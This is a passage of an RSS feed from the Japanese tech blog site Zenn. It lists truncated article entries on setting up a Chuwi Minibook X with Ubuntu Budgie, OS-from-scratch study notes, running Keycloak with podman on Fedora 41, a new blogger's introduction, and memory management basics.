+当初は、軽量なOSであるChrome OSをインストールして活用することを考えていましたが、公式の「Chrome OS Flex」を試したところ、カーネルのバージョンが古すぎたためか、N100搭載のChuwi...]]></description><link>https://zenn.dev/komde/articles/e1401915be2974</link><guid isPermaLink="true">https://zenn.dev/komde/articles/e1401915be2974</guid><pubDate>Thu, 08 May 2025 09:59:59 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--D3us1Wqi--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Chuwi%2520Minibook%2520X%2520%25E3%2582%2592Ubuntu%2520Budgie%25E3%2581%25A7%25E9%2596%258B%25E7%2599%25BA%25E3%2583%259E%25E3%2582%25B7%25E3%2583%25B3%25E3%2581%25AB%25E4%25BB%2595%25E7%25AB%258B%25E3%2581%25A6%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Taiki%2520Komoda%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUFUWEFKeHVSdWhURVRQOWVLeHRzUmViSFB4MHpMcWc2cjRpQl9icjlwXzk9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Taiki Komoda</dc:creator></item><item><title><![CDATA[ゼロからのOS自作入門 メモ (Day1-2)]]></title><description><![CDATA[こんにちは、kaiwareです。
+みかん本Day1その2。
+前回の記事が長くなってしまったので続きを書いていく。
+
+ 出現した用語の調査
+
+ 「#!/bin/bash」とは
+ShellScriptの1行目に #!/bin/bash と書かれていることがあるが、これは /bin/bash がスクリプトを実行することを表している。
+この行のことを シェバン(shebang, シバン) と呼ぶ。
+
+ ループバックデバイス
+mountコマンドの-o loopはループバックデバイスを指定するオプション。
+ループバックデバイスとはLinuxの仮想デバイスの一種。
+普通のファイル（例：disk.img...]]></description><link>https://zenn.dev/kaiware0x/articles/mikan-osbook-day1-2</link><guid isPermaLink="true">https://zenn.dev/kaiware0x/articles/mikan-osbook-day1-2</guid><pubDate>Wed, 07 May 2025 13:33:09 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--fEi7TWAN--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25BC%25E3%2583%25AD%25E3%2581%258B%25E3%2582%2589%25E3%2581%25AEOS%25E8%2587%25AA%25E4%25BD%259C%25E5%2585%25A5%25E9%2596%2580%2520%25E3%2583%25A1%25E3%2583%25A2%2520%2528Day1-2%2529%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:kaiware%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFjYTA3YzUyOTcuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>kaiware</dc:creator></item><item><title><![CDATA[Fedora41 サーバで Keycloak を使うときのメモ]]></title><description><![CDATA[お家の検証サーバ用の備忘録です。基本 root です。
+
+ 実行基盤の準備
+keycloak はコンテナ環境での本番利用が想定されているようなので podman を使います。
+dnf install -y podman podman-compose
+
+ Keycloak の実行
+IaC は以下のようにします。本番環境では外部データベースを利用しますが、検証なので内蔵データベースで済ませます。podman-compose down してもボリュームが消えないように永続化します。
+# docker-compose.yml
+version: "3.8"
+
+services:
+  keycloa...]]></description><link>https://zenn.dev/asterisk9101/articles/fedora41server-7</link><guid isPermaLink="true">https://zenn.dev/asterisk9101/articles/fedora41server-7</guid><pubDate>Tue, 06 May 2025 08:54:14 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--ynWBKpp8--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Fedora41%2520%25E3%2582%25B5%25E3%2583%25BC%25E3%2583%2590%25E3%2581%25A7%2520Keycloak%2520%25E3%2582%2592%25E4%25BD%25BF%25E3%2581%2586%25E3%2581%25A8%25E3%2581%258D%25E3%2581%25AE%25E3%2583%25A1%25E3%2583%25A2%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E5%25A4%259A%25E7%2594%25B0%25E6%25B0%258F%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUFUWEFKd3hvZ1pLNDVtSmdsUDlROUZPUTcyRXg4eV9MeFdmejdma0V1aTA9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>多田氏</dc:creator></item><item><title><![CDATA[はじめに]]></title><description><![CDATA[
+ 初めまして、Zennでテックブログをはじめます。
+こんにちは、初めまして。
+都内でインフラエンジニアをしているkasumiです。
+
+ 自己紹介
+
+職種：インフラエンジニア
+経歴：ちょっと特殊で未経験から勤めながら基本情報とWindowsとLinuxサーバの構築の勉強をして、その後、都内のSIerで勤務しています。（まだ1年生）
+好きな領域：Linux（RHEL系）
+興味のある領域：自動化（Ansibleとか）、コンテナ（Docker、Kubernetes）
+取得資格：基本情報技術者、AWS SAA
+
+
+ このブログについて
+このブログでは、主に私の勉強内容をアウトプットする場として利...]]></description><link>https://zenn.dev/kasumi98/articles/664241b4acedfa</link><guid isPermaLink="true">https://zenn.dev/kasumi98/articles/664241b4acedfa</guid><pubDate>Tue, 06 May 2025 08:12:34 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--z2FzYhKS--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_72:%25E3%2581%25AF%25E3%2581%2598%25E3%2582%2581%25E3%2581%25AB%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:kasumi98%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTDgzZW0xZUZKM2VPNm5SR0VqVU5DVnFqRjRvcmdfdUNXRHUzek9hVzQxYzQ5ZW1sWTU9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>kasumi98</dc:creator></item><item><title><![CDATA[メモリ管理って結局どうなってんねん]]></title><description><![CDATA[
+ 概要
+メモリをどのように利用しているか気になる人はいるでしょうか？
+メモリがあるおかげでプログラムのロードや、ArrayやMap で使いたい可変の領域を確保できているんですよね。
+メモリには物理メモリ、仮想メモリが存在し、それらを支える仕組みが多数存在します。
+それらが高度に抽象化されているおかげで普段意識せずにプログラミングできています💪
+そんなメモリを支える技術の概要を調べてまとめてみましたので、入口として参考になれたらと思います。
+
+ 対象読者
+
+メモリがどのように管理されているのか知りたい人
+
+
+ 物理メモリって？
+物理メモリといえば長方形で細長いやつです。
+Amazon に...]]></description><link>https://zenn.dev/fah_72946_engr/articles/4429434840145e</link><guid isPermaLink="true">https://zenn.dev/fah_72946_engr/articles/4429434840145e</guid><pubDate>Mon, 05 May 2025 12:07:49 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--N8X1ISqa--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%25A1%25E3%2583%25A2%25E3%2583%25AA%25E7%25AE%25A1%25E7%2590%2586%25E3%2581%25A3%25E3%2581%25A6%25E7%25B5%2590%25E5%25B1%2580%25E3%2581%25A9%25E3%2581%2586%25E3%2581%25AA%25E3%2581%25A3%25E3%2581%25A6%25E3%2582%2593%25E3%2581%25AD%25E3%2582%2593%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:dsktchr%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzg3ZGY2MDA2M2UuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>dsktchr</dc:creator></item></channel></rss>
